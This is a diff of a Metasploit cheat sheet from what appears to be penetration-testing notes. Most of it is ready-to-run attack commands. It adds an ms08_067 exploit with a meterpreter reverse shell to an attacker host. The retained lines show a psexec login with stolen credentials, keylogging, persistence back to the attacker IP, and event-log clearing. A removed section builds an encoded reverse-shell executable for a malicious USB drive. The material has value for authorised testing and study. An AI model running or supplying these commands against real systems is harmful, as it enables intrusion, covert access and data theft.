@@ -1,53 +1,52 @@
 Metasploit
 
 
-# Fix database issue
+service postgrsql start       Start the PostreSQL db.
+msfconsole                    Start Metasploit.
+msf > db_status               Check that you are connected to the db.
+------------------------------------------------------------------------------------------------------
 
-root@kali:~# service postgresql start; service metasploit start
+# Setup - create new user and db
+
+root@kali:~# service postgresql start
 root@kali:~# su postgres
-postgres@kali:~$ createuser lee -P
+postgres@kali:~$ createuser <username> -P
 Enter password for new role: 
 Enter it again: 
-Shall the new role be a superuser? (y/n) n
-Shall the new role be allowed to create databases? (y/n) n
-Shall the new role be allowed to create more new roles? (y/n) n
-postgres@kali:~$ createdb --owner=lee msf
+postgres@kali:~$ createdb --owner=<username> msf
 postgres@kali:~$ exit
-exit
-root@kali:~# msfconsole
-msf > db_connect lee:<password>@127.0.0.1:5432/msf
-msf > hosts
+
+# Autoconnect to db
+
+nano ~/.msf5/database.yml
+production:
+    adapter: postgresql
+    database: msf
+    username: <username>
+    password: <password>
+    host: 127.0.0.1
+    port: 5432
+    pool: 5
+    timeout: 5
 ------------------------------------------------------------------------------------------------------
 
-# msfcli
+help or ?                     Show available commands and their descriptions.
+show -h                       Show help on the 'show' command.
 
-msfcli -h
-
-All options are case-sensitive. 
-msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.20 PAYLOAD=cmd/unix/reverse LHOST=10.0.0.5 E
-
-If you are not sure about what options belong to a particular module, you can append the letter 'O' to the end of the string. 
-msfcli exploit/multi/samba/usermap_script O
-
-To display the payloads that are available for the current module, append the letter 'P' to the end of the string.
-msfcli exploit/multi/samba/usermap_script P
-------------------------------------------------------------------------------------------------------
-
-# msfconsole
-
-msfconsole
-
-help or ?                     List available commands and their descriptions.
-------------------------------------------------------------------------------------------------------
-
-# Using Exploits
+search <string>               Search for a particular string.
+search ms08                   Show all Microsoft exploits released in 2008.
 
 use <exploit>
-show targets
-show payloads
-show options
+use exploit/windows/smb/ms08_067_netapi
+show targets                  Show various OSs that can be targeted with this exploit.
+show payloads                 Show all payloads that work with this exploit.
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options                  Show remainging options for the payload.
+set LPORT 443                 Set the listening port to 443.
+set LHOST <attacker IP>       Set the listner to the attaer's IP.
 show advanced
 show evasion
+exploit                       Run the exploit.
 ------------------------------------------------------------------------------------------------------
 
 # Active Exploits
@@ -59,7 +58,7 @@ use exploit/windows/smb/psexec
 set RHOST 10.0.0.20
 set PAYLOAD windows/shell/reverse_tcp
 set LHOST 10.0.0.5
-set LPORT 4444
+set LPORT 443
 set SMBUSER victim
 set SMBPASS s3cr3t
 exploit
@@ -96,31 +95,27 @@ msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe
 
 # Database
 
-root@kali:~# service postgresql start          Start up the postgresql server before using the database.
-root@kali:~# service metasploit start          Create a msf3 datauser user and database called msf3. 
-root@kali:~# msfconsole
-
 msf > help database
 
 Database Backend Commands
 =========================
 
-    Command           Description
-    -------           -----------
-    creds             List all credentials in the database
-    db_connect        Connect to an existing database
-    db_disconnect     Disconnect from the current database instance
-    db_export         Export a file containing the contents of the database
-    db_import         Import a scan result file (filetype will be auto-detected)
-    db_nmap           Executes nmap and records the output automatically
-    db_rebuild_cache  Rebuilds the database-stored module cache
-    db_status         Show the current database status
-    hosts             List all hosts in the database
-    loot              List all loot in the database
-    notes             List all notes in the database
-    services          List all services in the database
-    vulns             List all vulnerabilities in the database
-    workspace         Switch between database workspaces
+    Command                   Description
+    -------                   -----------
+    creds                     List all credentials in the database
+    db_connect                Connect to an existing database
+    db_disconnect             Disconnect from the current database instance
+    db_export                 Export a file containing the contents of the database
+    db_import                 Import a scan result file (filetype will be auto-detected)
+    db_nmap                   Executes nmap and records the output automatically
+    db_rebuild_cache          Rebuilds the database-stored module cache
+    db_status                 Show the current database status
+    hosts                     List all hosts in the database
+    loot                      List all loot in the database
+    notes                     List all notes in the database
+    services                  List all services in the database
+    vulns                     List all vulnerabilities in the database
+    workspace                 Switch between database workspaces
 
 services -p 22                List specific ports.
 services -s http              List specific services.
@@ -190,6 +185,7 @@ set LPORT <port>
 set RHOST <target IP>
 exploit
 --------------------------------------------------------------------------------
+
 idletime
      if time < 5 min
      keyscan_start                            Start the keylogger.
@@ -216,7 +212,7 @@ exploit -j
 sendEmail -t ceo@target.com -f hacker@gmail.com -s <target IP> -u Salaries -a /root/Desktop/salaries.pdf
 ------------------------------------------------------------------------------------------------------
 
-# Meterpreter - Pivoting
+# Pivoting
  
 meterpreter > ipconfig
 192.168.0.10
@@ -369,20 +365,6 @@ meterpreter > clearev
 meterpreter > exit
 ==========
 
-# Malicious USB Drive
-
-msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
-msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=10.0.0.5 LPORT=443 > evil.exe
-msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 R | msfencode -b "/x00" -t exe -e x86/shikata_ga_nai -c 6 -o evil.exe 
-
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 10.0.0.5
-set LPORT 443
-set ExitOnSession false
-exploit -j
-==========
-
 upload <local path> <remote path>
 upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
 ==========
@@ -407,7 +389,7 @@ run persistence -r <attacker IP> -p 443 -A -x -i 100
 background
 sessions
 (notice the new session opened)
-sessions -i <new session Id>
+sessions -i <new session ID>
 ls
 getuid
 run winenum
@@ -436,13 +418,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 21
 set ExitOnSession false
-# set AutoRunScript path to script you want to autorun after exploit is fired 
+# set AutoRunScript <Path to script you want to autorun after exploit is fired.> 
 set AutoRunScript persistence -r <target IP> -p 21 -A -X -i 30 
 exploit -j -z
-==========
-
-# Shows all the scripts
-run <tab>
 ==========
 
 # Find and download files
